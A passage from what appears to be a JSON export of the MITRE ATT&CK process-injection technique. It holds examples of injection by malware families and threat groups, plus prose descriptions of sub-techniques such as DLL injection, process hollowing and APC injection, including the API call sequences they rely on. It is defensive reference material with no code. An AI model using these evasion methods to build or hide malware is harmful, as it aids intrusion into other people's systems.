"description": "Ninja has the ability to inject an agent module into a new process and arbitrary shellcode into running processes."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can start and inject code into a new svchost process."}, {"id": "S1050", "name": "PcShare", "description": "The PcShare payload has been injected into the logagent.exe and rdpclip.exe processes."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used various methods of process injection including hot patching."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains multiple modules for injecting into processes, such as Invoke-PSInject."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command to hide itself through injecting into another process."}, {"id": "S0496", "name": "REvil", "description": "REvil can inject itself into running processes on a compromised host."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has injected an install module into a newly created process."}, {"id": "G0091", "name": "Silence", "description": "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can inject code into local and remote processes."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can inject into running processes on a compromised host."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader injects into the Internet Explorer process."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes."}, {"id": "G0010", "name": "Turla", "description": "Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can inject decrypted shellcode into the LanmanServer service."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can inject files into running processes."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird performs multiple process injections to hijack system processes and execute malicious code."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used process injection to execute payloads to escalate privileges."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread."}], "sub_techniques": [{"name": "Dynamic-link Library Injection", "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL).\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.001", "examples": [{"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH has the ability to execute a malicious DLL by injecting into explorer.exe on a compromised machine."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy injects its DLL component into svchost.exe."}, {"id": "S1039", "name": "Bumblebee", "description": "The Bumblebee loader can support the Dij command which gives it the ability to inject DLLs into the memory of other processes."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used a DLL named D8B3.dll that was injected into the Winlogon process."}, {"id": "S0484", "name": "Carberp", "description": "Carberp's bootkit can inject a malicious DLL into the address space of running processes."}, {"id": "S0335", "name": "Carbon", "description": "Carbon has a command to inject code into a process."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to load DLLs via reflective injection."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process."}, {"id": "S0575", "name": "Conti", "description": "Conti has loaded an encrypted DLL into memory and then executes it."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can use a .NET-based DLL named RunPe6 for process injection."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi injects itself into the secure shell (SSH) process."}, {"id": "S0038", "name": "Duqu", "description": "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host)."}, {"id": "S0024", "name": "Dyre", "description": "Dyre injects into other processes to load modules."}, {"id": "S0081", "name": "Elise", "description": "Elise injects DLL files into iexplore.exe."}, {"id": "S0082", "name": "Emissary", "description": "Emissary injects its DLL file into a newly spawned Internet Explorer process."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed injecting in to Explorer.exe and other processes. "}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream FilepakMonitor component can inject into the Bka.exe process using the VirtualAllocEx, WriteProcessMemory and CreateRemoteThread APIs to load the DLL component."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to inject DLLs into specific processes."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to inject DLLs into processes."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can inject a DLL into rundll32.exe for execution."}, {"id": "S0135", "name": "HIDEDRV", "description": "HIDEDRV injects a DLL for Downdelph into the explorer.exe process."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe."}, {"id": "S0265", "name": "Kazuar", "description": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can perform process injection by using a reflective DLL."}, {"id": "G0032", "name": "Lazarus Group", "description": "A Lazarus Group malware sample performs reflective DLL injection."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has injected Mispadu\u2019s DLL into a process."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT."}, {"id": "S0449", "name": "Maze", "description": "Maze has injected the malware DLL into a target process."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex loads injecthelper.dll into a newly created rundll32.exe process."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe)."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can inject a DLL into rundll32.exe for execution."}, {"id": "S0457", "name": "Netwalker", "description": "The Netwalker DLL has been injected reflectively into the memory of a legitimate running process."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can inject its modules into various processes using reflective DLL loading."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy can inject a malicious DLL into a process."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process."}, {"id": "S0613", "name": "PS1", "description": "PS1 can inject its payload DLL Into memory."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can migrate into another process using reflective DLL injection."}, {"id": "G0024", "name": "Putter Panda", "description": "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe)."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use ImprovedReflectiveDLLInjection to deploy components."}, {"id": "S0055", "name": "RARSTONE", "description": "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA performs a reflective DLL injection using a given pid."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can perform DLL injection."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has injected its DLL component into EhStorAurhn.exe."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has injected a DLL into svchost.exe."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot creates a suspended svchost process and injects its DLL into it."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute loadfromfile, loadfromstorage, and loadfrommem to inject a DLL  from disk, storage, or memory respectively."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe."}, {"id": "G0092", "name": "TA505", "description": "TA505 has been seen injecting a DLL into winword.exe."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can perform DLL loading."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to inject DLLs for malicious plugins into running processes."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe."}, {"id": "G0010", "name": "Turla", "description": "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use DLL injection to load embedded files and modules."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell is injected into a shared SVCHOST process."}]}, {"name": "Portable Executable Injection", "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.002", "examples": [{"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has injected Latrodectus into the Explorer.exe process on comrpomised hosts."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak downloads an executable and injects it directly into a new process."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN can inject its decrypted payload into another process."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can use its own PE loader to execute payloads in memory."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has a module to inject a PE binary into a remote process."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject its backdoor as a portable executable into a target process."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can execute PE files in the address space of the specified process."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot, following payload decryption, creates a process hard-coded into the dropped (e.g., WerFault.exe) and injects the decrypted core modules into it."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process."}]}, {"name": "Thread Execution Hijacking", "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.003", "examples": [{"id": "S0168", "name": "Gazer", "description": "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot can create a suspended instance of a legitimate process (e.g., ctfmon.exe), allocate memory within the suspended process corresponding to Pikabot's core module, then redirect execution flow via SetContextThread API so that when the thread resumes the Pikabot core module is executed."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can use thread injection to inject shellcode into the process of security software."}]}, {"name": "Asynchronous Procedure Call", "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL).\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.004", "examples": [{"id": "S0438", "name": "Attor", "description": "Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can inject itself into a new svchost.exe -k netsvcs process using the asynchronous procedure call (APC) queue."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use asynchronous procedure call (APC) injection to execute commands received from C2."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has injected malicious code into a new svchost.exe process."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used ZwQueueApcThread to inject itself into remote processes."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject its code into a trusted process via the APC queue."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has written its payload into a newly-created EhStorAuthn.exe process using ZwWriteVirtualMemory and executed it using NtQueueApcThread and ZwAlertResumeThread."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use the QueueUserAPC API to execute shellcode on a compromised machine."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\""}]}, {"name": "Thread Local Storage", "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other Process Injection techniques such as Process Hollowing.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.005", "examples": [{"id": "S0386", "name": "Ursnif", "description": "Ursnif has injected code into target processes via thread local storage callbacks."}]}, {"name": "Ptrace System Calls", "description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction).\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.008", "examples": [{"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER can use PTRACE to attach to a targeted process to read process memory."}]}, {"name": "Proc Memory", "description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within /proc/[pid]/maps can be overwritten using dd.\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.009", "examples": [{"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity final payload installation includes mounting and binding to the \\/proc\\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts."}]}, {"name": "Extra Window Memory Injection", "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.011", "examples": [{"id": "S0091", "name": "Epic", "description": "Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process."}, {"id": "S0177", "name": "Power Loader", "description": "Power Loader overwrites Explorer\u2019s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."}]}, {"name": "Process Hollowing", "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.012", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can execute binaries through process hollowing."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use process hollowing for execution."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe."}, {"id": "S0354", "name": "Denis", "description": "Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%."}, {"id": "S0038", "name": "Duqu", "description": "Duqu is capable of loading executable code via process hollowing."}, {"id": "S0367", "name": "Emotet", "description": "Emotet uses a copy of certutil.exe stored in a temporary directory for process hollowing, starting the program in a suspended state before loading malicious code."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can inject its Delphi executable into ImagingDevices.exe using a process hollowing technique."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can use process hollowing to inject one of its trojans into another process."}, {"id": "S0483", "name": "IcedID", "description": "IcedID can inject a Cobalt Strike beacon into cmd.exe via process hallowing."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used process hollowing to inject itself into legitimate Windows process."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant."}, {"id": "S0198", "name": "NETWIRE", "description": "The NETWIRE payload has been injected into benign Microsoft executables via process hollowing."}, {"id": "S0229", "name": "Orz", "description": "Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use process hollowing to execute its main payload."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will execute a legitimate process, then suspend it to inject code for a Tor client into the process, followed by resumption of the process to enable Tor client execution."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can launch itself from a hollowed svchost.exe process."}, {"id": "S1018", "name": "Saint Bot", "description": "The Saint Bot loader has used API calls to spawn MSBuild.exe in a suspended state before injecting the decrypted Saint Bot binary into it."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can use RunPE to execute malicious payloads within a hollowed Windows process."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used process hollowing to execute CyberGate malware."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot injects into the svchost.exe process."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used process hollowing to inject into child processes."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility InstallUtil.exe."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can create a suspended notepad process and write shellcode to delete a file into the suspended process using NtWriteVirtualMemory."}]}, {"name": "Process Doppelg\u00e4nging", "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process.\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.\nProcess Doppelg\u00e4nging is implemented in 4 steps :\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process.", "id": 